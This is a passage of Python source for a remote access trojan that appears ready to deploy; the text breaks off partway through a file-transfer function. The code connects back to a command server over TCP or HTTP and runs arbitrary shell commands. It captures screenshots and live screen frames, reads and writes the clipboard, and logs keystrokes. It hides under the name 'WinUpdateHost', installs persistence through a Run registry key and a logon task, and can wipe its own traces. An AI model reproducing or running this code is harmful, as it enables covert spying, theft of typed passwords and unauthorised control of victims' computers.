#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
RAF agent -- single-file reverse access agent.

Deploy with builder.py, or edit HOST / PORT / KEY below by hand and run it.
Connects back to server.py, executes commands, transfers files, captures the
screen, logs keystrokes and installs persistence.

stdlib only. Windows-first; shell / file ops degrade gracefully on POSIX.
"""

import base64
import csv
import ctypes
import hashlib
import hmac
import io
import json
import locale
import os
import platform
import random
import shutil
import socket
import struct
import subprocess
import sys
import tempfile
import threading
import time

# --------------------------------------------------------------- configuration
HOST = "127.0.0.1"
PORT = 4444
KEY = "r4f-0000000000000000000000000000"          # must match server --key
RECONNECT_MIN = 3
RECONNECT_MAX = 60
STEALTH = False        # builder --stealth flips this on: hidden relaunch + mutex
TRANSPORT = "tcp"      # "http" polls <HTTP_BASE>/c2/poll -- works through any tunnel
HTTP_BASE = ""
BOOTSTRAP = ""         # rendezvous channel: live C2 url is read from here on every sync
# ------------------------------------------------------------------------------

IS_WIN = os.name == "nt"
_KEY = KEY.encode() if isinstance(KEY, str) else KEY

_FRAME = struct.Struct(">I")
_NONCE = 8
_TAG = 16
_MAX_FRAME = 96 * 1024 * 1024
_CHUNK = 48 * 1024

STATE = {"cwd": os.getcwd(), "sleep": 0}
_KEYLOG = {"inst": None}


# ------------------------------------------------------------------- transport
def _keystream(key, nonce, n):
    out = bytearray()
    ctr = 0
    while len(out) < n:
        out += hashlib.sha256(key + nonce + ctr.to_bytes(4, "big")).digest()
        ctr += 1
    return bytes(out[:n])


def _seal(key, plain):
    nonce = os.urandom(_NONCE)
    ct = bytes(a ^ b for a, b in zip(plain, _keystream(key, nonce, len(plain))))
    tag = hmac.new(key, nonce + ct, hashlib.sha256).digest()[:_TAG]
    return nonce + ct + tag


def _open(key, blob):
    if len(blob) < _NONCE + _TAG:
        raise ValueError("short frame")
    nonce, ct, tag = blob[:_NONCE], blob[_NONCE:-_TAG], blob[-_TAG:]
    want = hmac.new(key, nonce + ct, hashlib.sha256).digest()[:_TAG]
    if not hmac.compare_digest(tag, want):
        raise ValueError("authentication failed")
    return bytes(a ^ b for a, b in zip(ct, _keystream(key, nonce, len(ct))))


def send(sock, obj, key=None):
    blob = _seal(key or _KEY, json.dumps(obj, separators=(",", ":")).encode())
    sock.sendall(_FRAME.pack(len(blob)) + blob)


def _recv_exact(sock, n):
    buf = bytearray()
    while len(buf) < n:
        part = sock.recv(n - len(buf))
        if not part:
            raise ConnectionError("peer closed")
        buf += part
    return bytes(buf)


def recv(sock, key=None):
    (n,) = _FRAME.unpack(_recv_exact(sock, 4))
    if n <= 0 or n > _MAX_FRAME:
        raise ValueError("bad frame size %d" % n)
    return json.loads(_open(key or _KEY, _recv_exact(sock, n)).decode())


# ------------------------------------------------------------- http transport
class _MemSock:
    """Stand-in for a socket so dispatch() works unchanged over HTTP."""

    def __init__(self):
        self.out = []
        self.buf = b""

    def sendall(self, blob):
        (n,) = _FRAME.unpack(blob[:4])
        self.out.append(blob[4:4 + n])

    def recv(self, n):
        while not self.buf:
            raise ConnectionError("no inbound data")
        part, self.buf = self.buf[:n], self.buf[n:]
        return part

    def close(self):
        pass


def _post(url, obj, timeout=45):
    import urllib.request
    body = json.dumps(obj, separators=(",", ":")).encode()
    sig = hmac.new(_KEY, body, hashlib.sha256).hexdigest()
    req = urllib.request.Request(url, data=body, headers={
        "Content-Type": "application/json",
        "X-Sig": sig,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    })
    with urllib.request.urlopen(req, timeout=timeout) as r:
        raw = r.read().decode("utf-8", "replace")
    return json.loads(raw) if raw.strip() else {}


def _bootstrap_base(url, timeout=20):
    """Read the live C2 endpoint from the rendezvous channel (last message wins)."""
    import urllib.request
    try:
        req = urllib.request.Request(
            url.rstrip("/") + "/json?poll=1&since=all",
            headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode("utf-8", "replace")
    except Exception:
        return ""
    best = ""
    for line in raw.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            m = json.loads(line)
        except Exception:
            continue
        if m.get("event") != "message":
            continue
        try:
            cfg = json.loads(m.get("message") or "{}")
        except Exception:
            continue
        b = (cfg.get("base") or "").strip().rstrip("/")
        if b.startswith("http"):
            best = b
    return best


def http_loop(base):
    base = (base or "").rstrip("/")
    sid = os.urandom(4).hex()
    info = sysinfo()
    delay = RECONNECT_MIN
    fails = 0
    synced = 0.0
    while True:
        if BOOTSTRAP:
            stale = (not base) or fails >= 3 or (time.time() - synced) > 600
            if stale:
                got = _bootstrap_base(BOOTSTRAP)
                synced = time.time()
                if got and got != base:
                    base = got
                    fails = 0
                    delay = RECONNECT_MIN
        if not base:
            time.sleep(max(delay, 10))
            delay = min(delay * 2, RECONNECT_MAX)
            fails += 1
            continue
        try:
            j = _post(base + "/c2/poll", {"sid": sid, "info": info}, timeout=45)
            delay = RECONNECT_MIN
            fails = 0
            cmds = j.get("cmds") or []
            if not cmds:
                time.sleep(0.8)
                continue
            for c in cmds:
                ms = _MemSock()
                rid = c.get("id")
                try:
                    dispatch(ms, rid, c.get("op"), c.get("args") or {})
                except SystemExit:
                    raise
                except Exception as exc:
                    send(ms, {"t": "result", "id": rid, "ok": False, "out": "[!] %s" % exc})
                msgs = []
                for blob in ms.out:
                    try:
                        msgs.append(json.loads(_open(_KEY, blob).decode()))
                    except Exception:
                        pass
                if msgs:
                    _post(base + "/c2/result", {"sid": sid, "id": rid, "msgs": msgs})
        except SystemExit:
            raise
        except Exception:
            fails += 1
            time.sleep(delay + random.uniform(0, delay * 0.3))
            delay = min(delay * 2, RECONNECT_MAX)


# --------------------------------------------------------------- host utilities
def is_admin():
    if not IS_WIN:
        return False
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False


def _console_encodings():
    """Candidate codecs for target output, most specific first."""
    encs = ["utf-8"]
    if IS_WIN:
        try:
            k = ctypes.windll.kernel32
            for cp in (k.GetOEMCP(), k.GetACP()):
                name = "cp%d" % cp
                if name not in encs:
                    encs.append(name)
        except Exception:
            pass
        for extra in ("cp850", "cp1252"):
            if extra not in encs:
                encs.append(extra)
    else:
        try:
            name = locale.getpreferredencoding(False)
            if name and name not in encs:
                encs.append(name)
        except Exception:
            pass
    encs.append("latin-1")
    return encs


_ENCODINGS = _console_encodings()


def _decode(data):
    """Decode target output: UTF-8 first, then the console codepage (OEM/ANSI)."""
    if not data:
        return ""
    for enc in _ENCODINGS:
        try:
            return data.decode(enc)
        except (UnicodeDecodeError, LookupError):
            continue
    return data.decode("latin-1", "replace")


def _clean(text):
    """Normalise line endings so the console does not double-space output."""
    return text.replace("\r\n", "\n").replace("\r", "")


def sysinfo():
    return {
        "host": socket.gethostname(),
        "user": os.environ.get("USERNAME") or os.environ.get("USER") or "?",
        "os": "%s %s" % (platform.system(), platform.release()),
        "build": platform.version(),
        "arch": platform.machine(),
        "pid": os.getpid(),
        "cwd": STATE["cwd"],
        "python": platform.python_version(),
        "admin": is_admin(),
        "ip": _local_ip(),
    }


def _local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "?"


def run_shell(cmd, timeout=180):
    if not cmd:
        return "(empty command)"
    try:
        p = subprocess.run(
            cmd, shell=True, cwd=STATE["cwd"],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, timeout=timeout,
        )
        text = _clean(_decode(p.stdout)).rstrip()
        return text if text else "(no output)"
    except subprocess.TimeoutExpired:
        return "[!] timeout after %ss" % timeout
    except Exception as exc:
        return "[!] %s" % exc


def process_list():
    """Full process table with untruncated image names."""
    if not IS_WIN:
        return run_shell("ps aux")
    try:
        p = subprocess.run("tasklist /fo csv /nh", shell=True,
                           stdout=subprocess.PIPE, stderr=subprocess.STDOUT, timeout=60)
        text = _clean(_decode(p.stdout))
        rows = []
        for line in text.splitlines():
            line = line.strip()
            if not line:
                continue
            try:
                parts = next(csv.reader(io.StringIO(line)))
            except Exception:
                continue
            if len(parts) >= 5:
                rows.append(parts[:5])
        if not rows:
            return text or "(no processes)"
        head = ("IMAGE", "PID", "SESSION", "SESSION#", "MEMORY")
        widths = [max(len(head[i]), max(len(r[i]) for r in rows)) for i in range(5)]
        fmt = "  ".join("%%-%ds" % w for w in widths)
        out = [fmt % head, fmt % tuple("-" * w for w in widths)]
        out.extend(fmt % tuple(r) for r in rows)
        return "\n".join(out)
    except Exception as exc:
        return "[!] %s" % exc


def list_dir(path=None):
    path = path or STATE["cwd"]
    try:
        rows = []
        for name in sorted(os.listdir(path)):
            full = os.path.join(path, name)
            try:
                st = os.stat(full)
                kind = "d" if os.path.isdir(full) else "-"
                rows.append("%s %12d  %s" % (kind, st.st_size, name))
            except OSError:
                rows.append("- %12s  %s" % ("?", name))
        return "\n".join(rows) or "(empty)"
    except Exception as exc:
        return "[!] %s" % exc


def hide_console():
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except Exception:
        pass


# ---------------------------------------------------------------------- stealth
def _payload_dir():
    return os.path.join(os.environ.get("APPDATA", os.path.expanduser("~")),
                        "Microsoft", "WinUpdateHost")


def _pythonw():
    exe = sys.executable
    if exe.lower().endswith("python.exe"):
        cand = exe[:-10] + "pythonw.exe"
        if os.path.exists(cand):
            return cand
    return exe


def stealth_relaunch():
    """Copy to %APPDATA% and restart there through pythonw, detached, no console."""
    if not IS_WIN:
        return False
    try:
        frozen = getattr(sys, "frozen", False)
        ext = ".exe" if frozen else ".py"
        dst = os.path.join(_payload_dir(), "wuhost" + ext)
        me = os.path.abspath(sys.argv[0])
        if os.path.abspath(dst).lower() == me.lower():
            return False                       # already running from the hidden copy
        os.makedirs(_payload_dir(), exist_ok=True)
        shutil.copy2(sys.executable if frozen else me, dst)
        if frozen:
            cmd = [dst, "--host", HOST, "--port", str(PORT), "--key", KEY]
        else:
            cmd = [_pythonw(), dst, "--host", HOST, "--port", str(PORT), "--key", KEY]
        if TRANSPORT == "http" and HTTP_BASE:
            cmd += ["--http", HTTP_BASE]
        if BOOTSTRAP:
            cmd += ["--bootstrap", BOOTSTRAP]
        subprocess.Popen(
            cmd, close_fds=True,
            stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            creationflags=0x00000008 | 0x00000200,   # DETACHED_PROCESS | NEW_PROCESS_GROUP
        )
        return True
    except Exception:
        return False


def single_instance():
    """True when this is the only running copy (named mutex, no privileges needed)."""
    if not IS_WIN:
        return True
    try:
        k = ctypes.windll.kernel32
        k.CreateMutexW(None, False, "WinUpdateHostMutex")
        return k.GetLastError() != 183        # ERROR_ALREADY_EXISTS
    except Exception:
        return True


# -------------------------------------------------------------------- clipboard
CF_UNICODETEXT = 13
GMEM_MOVEABLE = 0x0002


def clip_get():
    if not IS_WIN:
        return "[!] clipboard requires Windows"
    u, k = ctypes.windll.user32, ctypes.windll.kernel32
    u.OpenClipboard.argtypes = [ctypes.c_void_p]
    u.GetClipboardData.argtypes = [ctypes.c_uint]
    u.GetClipboardData.restype = ctypes.c_void_p
    k.GlobalLock.argtypes = [ctypes.c_void_p]
    k.GlobalLock.restype = ctypes.c_void_p
    k.GlobalUnlock.argtypes = [ctypes.c_void_p]
    if not u.OpenClipboard(None):
        return "[!] clipboard busy"
    try:
        h = u.GetClipboardData(CF_UNICODETEXT)
        if not h:
            return "(clipboard empty)"
        p = k.GlobalLock(h)
        if not p:
            return "(clipboard empty)"
        try:
            return ctypes.wstring_at(p) or "(empty)"
        finally:
            k.GlobalUnlock(h)
    finally:
        u.CloseClipboard()


def clip_set(text):
    if not IS_WIN:
        return "[!] clipboard requires Windows"
    u, k = ctypes.windll.user32, ctypes.windll.kernel32
    u.OpenClipboard.argtypes = [ctypes.c_void_p]
    u.SetClipboardData.argtypes = [ctypes.c_uint, ctypes.c_void_p]
    u.SetClipboardData.restype = ctypes.c_void_p
    k.GlobalAlloc.argtypes = [ctypes.c_uint, ctypes.c_size_t]
    k.GlobalAlloc.restype = ctypes.c_void_p
    k.GlobalLock.argtypes = [ctypes.c_void_p]
    k.GlobalLock.restype = ctypes.c_void_p
    k.GlobalUnlock.argtypes = [ctypes.c_void_p]
    data = str(text)
    buf = ctypes.create_unicode_buffer(data)
    size = ctypes.sizeof(buf)
    if not u.OpenClipboard(None):
        return "[!] clipboard busy"
    try:
        u.EmptyClipboard()
        h = k.GlobalAlloc(GMEM_MOVEABLE, size)
        if not h:
            return "[!] GlobalAlloc failed"
        p = k.GlobalLock(h)
        if not p:
            return "[!] GlobalLock failed"
        ctypes.memmove(p, buf, size)
        k.GlobalUnlock(h)
        u.SetClipboardData(CF_UNICODETEXT, h)
    finally:
        u.CloseClipboard()
    return "clipboard set (%d chars)" % len(data)


def set_wallpaper(path):
    if not IS_WIN:
        return "[!] wallpaper requires Windows"
    if not path or not os.path.isfile(path):
        return "[!] file not found on target: %s" % path
    ok = ctypes.windll.user32.SystemParametersInfoW(0x0014, 0, os.path.abspath(path), 3)
    return "wallpaper set" if ok else "[!] SystemParametersInfo failed"


def power(action):
    a = (action or "").lower().strip()
    if a == "lock":
        ctypes.windll.user32.LockWorkStation()
        return "workstation locked"
    flags = {"shutdown": "/s", "reboot": "/r", "logoff": "/l", "hibernate": "/h"}
    if a in flags:
        subprocess.Popen("shutdown %s /t 0" % flags[a], shell=True,
                         stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL)
        return "power: %s" % a
    return "[!] use: lock | reboot | shutdown | logoff | hibernate"


# ------------------------------------------------------------------- screenshot
def screenshot():
    """Grab the primary desktop into a 32-bit BMP via GDI. Returns (path, note)."""
    if not IS_WIN:
        return None, "[!] screenshot requires Windows"
    try:
        user32 = ctypes.windll.user32
        gdi32 = ctypes.windll.gdi32
        try:
            user32.SetProcessDPIAware()
        except Exception:
            pass

        w = user32.GetSystemMetrics(0)
        h = user32.GetSystemMetrics(1)
        if w <= 0 or h <= 0:
            return None, "[!] could not read desktop geometry"

        hdc = user32.GetDC(0)
        mem = gdi32.CreateCompatibleDC(hdc)
        bmp = gdi32.CreateCompatibleBitmap(hdc, w, h)
        old = gdi32.SelectObject(mem, bmp)
        gdi32.BitBlt(mem, 0, 0, w, h, hdc, 0, 0, 0x00CC0020)  # SRCCOPY
        gdi32.SelectObject(mem, old)

        class BIH(ctypes.Structure):
            _fields_ = [
                ("biSize", ctypes.c_uint32),
                ("biWidth", ctypes.c_int32),
                ("biHeight", ctypes.c_int32),
                ("biPlanes", ctypes.c_uint16),
                ("biBitCount", ctypes.c_uint16),
                ("biCompression", ctypes.c_uint32),
                ("biSizeImage", ctypes.c_uint32),
                ("biXPelsPerMeter", ctypes.c_int32),
                ("biYPelsPerMeter", ctypes.c_int32),
                ("biClrUsed", ctypes.c_uint32),
                ("biClrImportant", ctypes.c_uint32),
            ]

        bi = BIH()
        bi.biSize = ctypes.sizeof(BIH)
        bi.biWidth = w
        bi.biHeight = -h              # top-down rows
        bi.biPlanes = 1
        bi.biBitCount = 32
        bi.biCompression = 0          # BI_RGB
        bi.biSizeImage = w * 4 * h

        buf = ctypes.create_string_buffer(bi.biSizeImage)
        got = gdi32.GetDIBits(mem, bmp, 0, h, buf, ctypes.byref(bi), 0)
        if not got:
            gdi32.DeleteObject(bmp)
            gdi32.DeleteDC(mem)
            user32.ReleaseDC(0, hdc)
            return None, "[!] GetDIBits failed"

        info = ctypes.string_at(ctypes.byref(bi), bi.biSize)
        gdi32.DeleteObject(bmp)
        gdi32.DeleteDC(mem)
        user32.ReleaseDC(0, hdc)

        path = os.path.join(tempfile.gettempdir(), "raf_scr_%d.bmp" % int(time.time() * 1000))
        with open(path, "wb") as f:
            f.write(struct.pack("<2sIHHI", b"BM", 14 + len(info) + bi.biSizeImage, 0, 0, 14 + len(info)))
            f.write(info)
            f.write(buf.raw)
        return path, "captured %dx%d" % (w, h)
    except Exception as exc:
        return None, "[!] %s" % exc


# ------------------------------------------------------- live view (JPEG/GDI+)
class _GUID(ctypes.Structure):
    _fields_ = [("Data1", ctypes.c_uint32), ("Data2", ctypes.c_uint16),
                ("Data3", ctypes.c_uint16), ("Data4", ctypes.c_ubyte * 8)]


class _CodecInfo(ctypes.Structure):
    _fields_ = [("Clsid", _GUID), ("FormatID", _GUID),
                ("CodecName", ctypes.c_wchar_p), ("DllName", ctypes.c_wchar_p),
                ("FormatDescription", ctypes.c_wchar_p),
                ("FilenameExtension", ctypes.c_wchar_p),
                ("MimeType", ctypes.c_wchar_p),
                ("Flags", ctypes.c_uint32), ("Version", ctypes.c_uint32),
                ("SigCount", ctypes.c_uint32), ("SigSize", ctypes.c_uint32),
                ("SigPattern", ctypes.c_void_p), ("SigMask", ctypes.c_void_p)]


class _StartupInput(ctypes.Structure):
    _fields_ = [("GdiplusVersion", ctypes.c_uint32),
                ("DebugEventCallback", ctypes.c_void_p),
                ("SuppressBackgroundThread", ctypes.c_int),
                ("SuppressExternalCodecs", ctypes.c_int)]


class _EncoderParameter(ctypes.Structure):
    _fields_ = [("Guid", _GUID), ("NumberOfValues", ctypes.c_uint32),
                ("Type", ctypes.c_uint32), ("Value", ctypes.c_void_p)]


class _EncoderParameters(ctypes.Structure):
    _fields_ = [("Count", ctypes.c_uint32), ("Parameter", _EncoderParameter * 1)]


_ENC_QUALITY = _GUID(0x1D5BE4B5, 0xFA4A, 0x452D,
                     (ctypes.c_ubyte * 8)(0x9C, 0xDD, 0x5D, 0xB3, 0x51, 0x05, 0xE7, 0xEB))
_GDI = {"token": None, "clsid": None}


def _gdiplus():
    """Start GDI+ once and cache the JPEG encoder CLSID."""
    g = ctypes.windll.gdiplus
    if _GDI["token"] is not None:
        return g
    inp = _StartupInput()
    inp.GdiplusVersion = 1
    token = ctypes.c_void_p()
    if g.GdiplusStartup(ctypes.byref(token), ctypes.byref(inp), None) != 0:
        raise RuntimeError("GdiplusStartup failed")
    _GDI["token"] = token

    num, size = ctypes.c_uint32(), ctypes.c_uint32()
    g.GdipGetImageEncodersSize(ctypes.byref(num), ctypes.byref(size))
    buf = ctypes.create_string_buffer(size.value)
    g.GdipGetImageEncoders(num.value, size.value, buf)
    infos = ctypes.cast(buf, ctypes.POINTER(_CodecInfo))
    for i in range(num.value):
        mime = infos[i].MimeType
        if mime and mime.lower() == "image/jpeg":
            _GDI["clsid"] = infos[i].Clsid
            break
    if _GDI["clsid"] is None:
        raise RuntimeError("no JPEG encoder available")
    return g


def _save_jpeg(hbitmap, path, quality):
    g = _gdiplus()
    g.GdipCreateBitmapFromHBITMAP.argtypes = [ctypes.c_void_p, ctypes.c_void_p,
                                              ctypes.POINTER(ctypes.c_void_p)]
    g.GdipSaveImageToFile.argtypes = [ctypes.c_void_p, ctypes.c_wchar_p,
                                      ctypes.POINTER(_GUID), ctypes.c_void_p]
    bmp = ctypes.c_void_p()
    if g.GdipCreateBitmapFromHBITMAP(ctypes.c_void_p(hbitmap), None, ctypes.byref(bmp)) != 0:
        raise RuntimeError("GdipCreateBitmapFromHBITMAP failed")
    try:
        q = ctypes.c_long(int(quality))
        ep = _EncoderParameters()
        ep.Count = 1
        ep.Parameter[0].Guid = _ENC_QUALITY
        ep.Parameter[0].NumberOfValues = 1
        ep.Parameter[0].Type = 4              # EncoderParameterValueTypeLong
        ep.Parameter[0].Value = ctypes.cast(ctypes.byref(q), ctypes.c_void_p)
        st = g.GdipSaveImageToFile(bmp, path, ctypes.byref(_GDI["clsid"]), ctypes.byref(ep))
        if st != 0:
            raise RuntimeError("GdipSaveImageToFile failed (%d)" % st)
    finally:
        g.GdipDisposeImage(bmp)


def capture_jpeg(max_width=1280, quality=55):
    """One desktop frame as JPEG, downscaled to max_width. Returns (path, note)."""
    if not IS_WIN:
        return None, "[!] frame capture requires Windows"
    hdc = mem = scaled_mem = None
    bmp = target_bmp = None
    try:
        user32 = ctypes.windll.user32
        gdi32 = ctypes.windll.gdi32
        try:
            user32.SetProcessDPIAware()
        except Exception:
            pass

        w = user32.GetSystemMetrics(0)
        h = user32.GetSystemMetrics(1)
        if w <= 0 or h <= 0:
            return None, "[!] no desktop geometry"

        hdc = user32.GetDC(0)
        mem = gdi32.CreateCompatibleDC(hdc)
        bmp = gdi32.CreateCompatibleBitmap(hdc, w, h)
        old = gdi32.SelectObject(mem, bmp)
        gdi32.BitBlt(mem, 0, 0, w, h, hdc, 0, 0, 0x00CC0020)

        target_bmp, tw, th = bmp, w, h
        if max_width and w > int(max_width):
            tw = int(max_width)
            th = max(1, int(round(h * tw / float(w))))
            scaled_mem = gdi32.CreateCompatibleDC(hdc)
            target_bmp = gdi32.CreateCompatibleBitmap(hdc, tw, th)
            old2 = gdi32.SelectObject(scaled_mem, target_bmp)
            gdi32.SetStretchBltMode(scaled_mem, 4)      # HALFTONE
            gdi32.StretchBlt(scaled_mem, 0, 0, tw, th, mem, 0, 0, w, h, 0x00CC0020)
            gdi32.SelectObject(scaled_mem, old2)

        gdi32.SelectObject(mem, old)

        path = os.path.join(tempfile.gettempdir(), "raf_frame_%d.jpg" % int(time.time() * 1000))
        _save_jpeg(target_bmp, path, quality)
        return path, "frame %dx%d" % (tw, th)
    except Exception as exc:
        return None, "[!] %s" % exc
    finally:
        try:
            if scaled_mem:
                gdi32.DeleteObject(target_bmp)
                gdi32.DeleteDC(scaled_mem)
            if bmp:
                gdi32.DeleteObject(bmp)
            if mem:
                gdi32.DeleteDC(mem)
            if hdc:
                ctypes.windll.user32.ReleaseDC(0, hdc)
        except Exception:
            pass


# ------------------------------------------------------------- on-screen sign
_PLACA = {"close": threading.Event(), "running": False}


def show_placa(text, seconds=0, bg="#000000", fg="#ff2d2d"):
    """Fullscreen topmost sign on the target desktop. seconds=0 keeps it up."""
    if not IS_WIN:
        return "[!] overlay requires Windows"
    try:
        import tkinter as tk
    except Exception as exc:
        return "[!] tkinter unavailable: %s" % exc
    if _PLACA["running"]:
        close_placa()

    _PLACA["close"] = threading.Event()
    _PLACA["running"] = True

    def runner():
        try:
            root = tk.Tk()
            root.attributes("-fullscreen", True)
            root.attributes("-topmost", True)
            root.configure(bg=bg)
            root.overrideredirect(True)
            lbl = tk.Label(root, text=text, font=("Segoe UI", 56, "bold"),
                           fg=fg, bg=bg, wraplength=max(400, root.winfo_screenwidth() - 240),
                           justify="center")
            lbl.pack(expand=True)
            root.bind("<Escape>", lambda e: root.destroy())

            def tick():
                if _PLACA["close"].is_set():
                    try:
                        root.destroy()
                    except Exception:
                        pass
                    return
                root.after(150, tick)

            root.after(150, tick)
            if seconds and float(seconds) > 0:
                root.after(int(float(seconds) * 1000), root.destroy)
            root.mainloop()
        except Exception:
            pass
        finally:
            _PLACA["running"] = False

    threading.Thread(target=runner, daemon=True).start()
    return "placa exibida em %s" % socket.gethostname()


def close_placa():
    _PLACA["close"].set()
    return "placa fechada"


def show_msg(text, title="Aviso"):
    if not IS_WIN:
        return "[!] message box requires Windows"
    def runner():
        try:
            ctypes.windll.user32.MessageBoxW(0, str(text), str(title), 0x40)
        except Exception:
            pass
    threading.Thread(target=runner, daemon=True).start()
    return "mensagem exibida"


# -------------------------------------------------------------------- keylogger
_SHIFTED = {
    "1": "!", "2": "@", "3": "#", "4": "$", "5": "%", "6": "^", "7": "&",
    "8": "*", "9": "(", "0": ")", "-": "_", "=": "+", "[": "{", "]": "}",
    "\\": "|", ";": ":", "'": '"', ",": "<", ".": ">", "/": "?", "`": "~",
}

_NAMED = {
    0x08: "[BACK]", 0x09: "[TAB]", 0x0A: "[LF]", 0x0D: "[ENTER]", 0x1B: "[ESC]",
    0x20: " ", 0x21: "[PGUP]", 0x22: "[PGDN]", 0x23: "[END]", 0x24: "[HOME]",
    0x25: "[LEFT]", 0x26: "[UP]", 0x27: "[RIGHT]", 0x28: "[DOWN]", 0x2C: "[PRTSC]",
    0x2D: "[INS]", 0x2E: "[DEL]", 0x5B: "[WIN]", 0x5C: "[RWIN]", 0x14: "[CAPS]",
    0x90: "[NUMLOCK]", 0x91: "[SCROLL]",
}

_VK_BASE = {
    0xBA: ";", 0xBB: "=", 0xBC: ",", 0xBD: "-", 0xBE: ".", 0xBF: "/",
    0xC0: "`", 0xDB: "[", 0xDC: "\\", 0xDD: "]", 0xDE: "'",
}


def _vk_char(vk):
    try:
        u = ctypes.windll.user32
        shift = bool(u.GetAsyncKeyState(0x10) & 0x8000)
        caps = bool(u.GetKeyState(0x14) & 1)
    except Exception:
        shift, caps = False, False

    if 0x41 <= vk <= 0x5A:                                  # A-Z
        ch = chr(vk)
        return ch if (shift ^ caps) else ch.lower()
    if 0x30 <= vk <= 0x39:                                  # 0-9
        ch = chr(vk)
        return _SHIFTED.get(ch, ch) if shift else ch
    if 0x60 <= vk <= 0x69:                                  # numpad
        return str(vk - 0x60)
    if vk in _NAMED:
        return _NAMED[vk]
    base = _VK_BASE.get(vk)
    if base:
        return _SHIFTED.get(base, base) if shift else base
    return ""


class _Keylogger(threading.Thread):
    def __init__(self):
        super().__init__(daemon=True)
        self._buf = []
        self._lock = threading.Lock()
        self._stop = threading.Event()

    def run(self):
        if not IS_WIN:
            return
        u = ctypes.windll.user32
        down = set()
        while not self._stop.is_set():
            for vk in range(8, 256):
                if u.GetAsyncKeyState(vk) & 0x8000:
                    if vk in down:
                        continue
                    down.add(vk)
                    ch = _vk_char(vk)
                    if ch:
                        with self._lock:
                            self._buf.append(ch)
                else:
                    down.discard(vk)
            time.sleep(0.01)

    def stop(self):
        self._stop.set()

    def dump(self):
        with self._lock:
            data = "".join(self._buf)
            self._buf = []
        return data or "(no keystrokes captured)"


# ------------------------------------------------------------------ persistence
RUN_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
VALUE_NAME = "WinUpdateHost"
TASK_NAME = "WinUpdateHostTask"
INSTALL_DIR = os.path.join(os.environ.get("APPDATA", os.path.expanduser("~")), "Microsoft", "WinUpdateHost")


def _launch_cmd(target):
    if getattr(sys, "frozen", False):
        return '"%s"' % target
    exe = sys.executable
    if exe.lower().endswith("python.exe"):
        cand = exe[:-10] + "pythonw.exe"
        if os.path.exists(cand):
            exe = cand
    return '"%s" "%s"' % (exe, target)


def install():
    """Copy the payload to %APPDATA% and register Run key + logon task."""
    if not IS_WIN:
        return "[!] persistence requires Windows"
    import winreg

    frozen = getattr(sys, "frozen", False)
    src = sys.executable if frozen else os.path.abspath(__file__)
    ext = ".exe" if frozen else ".py"
    os.makedirs(INSTALL_DIR, exist_ok=True)
    dst = os.path.join(INSTALL_DIR, "wuhost" + ext)

    if os.path.abspath(src).lower() != os.path.abspath(dst).lower():
        shutil.copy2(src, dst)

    cmd = _launch_cmd(dst)
    if frozen:
        cmd += " --host %s --port %d --key %s" % (HOST, PORT, KEY)

    with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, RUN_KEY, 0, winreg.KEY_SET_VALUE) as k:
        winreg.SetValueEx(k, VALUE_NAME, 0, winreg.REG_SZ, cmd)

    task = subprocess.run(
        'schtasks /create /tn %s /tr "%s" /sc onlogon /f' % (TASK_NAME, cmd),
        shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
    )
    task_ok = task.returncode == 0

    return ("installed -> %s\nrun key : HKCU\\%s\\%s\nlogon task: %s"
            % (dst, RUN_KEY, VALUE_NAME, "ok" if task_ok else "failed"))


def uninstall():
    if not IS_WIN:
        return "[!] persistence requires Windows"
    import winreg

    notes = []
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_KEY, 0, winreg.KEY_SET_VALUE) as k:
            winreg.DeleteValue(k, VALUE_NAME)
        notes.append("run key removed")
    except Exception as exc:
        notes.append("run key: %s" % exc)

    task = subprocess.run("schtasks /delete /tn %s /f" % TASK_NAME, shell=True,
                          stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    notes.append("task: %s" % ("removed" if task.returncode == 0 else "not present"))

    try:
        if os.path.isdir(INSTALL_DIR):
            shutil.rmtree(INSTALL_DIR, ignore_errors=True)
            notes.append("files removed")
    except Exception:
        pass
    return "\n".join(notes)


def selfdestruct(delay=2):
    """Remove persistence, wipe every copy of this payload, then kill the process."""
    notes = []
    try:
        notes.append(uninstall())
    except Exception as exc:
        notes.append("uninstall: %s" % exc)

    me = os.path.abspath(sys.argv[0])
    targets = [me, _payload_dir()]
    tmp = tempfile.gettempdir()
    try:
        for name in os.listdir(tmp):
            if name.startswith(("raf_frame_", "raf_scr_")):
                targets.append(os.path.join(tmp, name))
    except OSError:
        pass

    if getattr(sys, "frozen", False):
        try:
            ctypes.windll.kernel32.MoveFileExW(me, None, 0x4)   # MOVEFILE_DELAY_UNTIL_REBOOT
        except Exception:
            pass

    lines = ["@echo off", 'cd /d "%TEMP%"', "timeout /t %d /nobreak >nul" % int(delay)]
    for t in targets:
        if os.path.isdir(t):
            lines.append('rmdir /s /q "%s" 2>nul' % t)
        else:
            lines.append('del /f /q "%s" 2>nul' % t)
    lines.append('del /f /q "%~f0" 2>nul')

    bat = os.path.join(tmp, "raf_cleanup_%d.bat" % int(time.time()))
    with open(bat, "w", encoding="utf-8", newline="") as f:
        f.write("\r\n".join(lines) + "\r\n")

    subprocess.Popen(["cmd", "/c", bat], creationflags=0x00000008, close_fds=True,
                     stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    notes.append("wiped %d path(s); process exiting" % len(targets))
    return "\n".join(notes)


# -------------------------------------------------------------------- file xfer
def send_file(sock, rid, path):
    try:
        with open(path, "rb") as f:
            data = f.read()
    except Exception as exc:
